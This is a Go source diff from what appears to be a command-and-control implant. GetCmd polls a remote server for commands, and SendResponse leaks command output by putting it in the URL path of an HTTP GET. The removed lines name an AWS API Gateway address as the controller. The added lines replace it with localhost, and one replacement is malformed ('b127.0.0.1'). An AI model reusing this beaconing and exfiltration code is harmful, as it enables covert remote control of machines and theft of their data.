@@ -29,9 +29,9 @@ func GetCmd(init int) (int){
 	var url string
 
 	if (init == 0){
-		url = "https://bye5n37js6.execute-api.eu-west-2.amazonaws.com/api/agent-check-in"
+		url = "https://127.0.0.1/agent-check-in"
 	}else{
-		url = "https://bye5n37js6.execute-api.eu-west-2.amazonaws.com/api/"
+		url = "https://b127.0.0.1/"
 	}
     resp, err := http.Get(url)
     if err != nil {
@@ -90,7 +90,7 @@ func GetCmd(init int) (int){
 
 func SendResponse(output string){
 
-    url := "https://bye5n37js6.execute-api.eu-west-2.amazonaws.com/api/" + url.PathEscape(output)
+    url := "https://127.0.0.1/" + url.PathEscape(output)
     _, err := http.Get(url)
     if err != nil {
 		//log.Fatalln(err)
